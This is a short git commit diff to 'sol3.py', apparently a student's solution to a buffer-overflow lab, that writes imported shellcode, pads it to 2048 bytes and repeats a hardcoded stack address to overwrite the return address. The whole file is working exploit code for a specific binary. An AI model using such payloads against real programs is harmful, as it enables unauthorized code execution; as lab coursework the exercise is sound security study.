775ad2986420cc260b582c1a6d7a548c64bc6b15
jordynk <jordyn13470@gmail.com>
2024-04-02 16:46:03 +0000

    sol3

--- sol3.py
+++ sol3.py
@@ -4,12 +4,11 @@ import sys
 
 from shellcode import shellcode
 
+
+
 sys.stdout.buffer.write(shellcode)
-sys.stdout.buffer.write(b'A'*1994)
+sys.stdout.buffer.write(b'A'*(2048 - len(shellcode)))
 sys.stdout.buffer.write(0x7ffffff6a610.to_bytes(8, 'little'))
 sys.stdout.buffer.write(0x7ffffff6a610.to_bytes(8, 'little'))
-
-
-
-
+sys.stdout.buffer.write(0x7ffffff6a610.to_bytes(8, 'little'))
 #start of shellcode --> 0x00007ffffff6a610
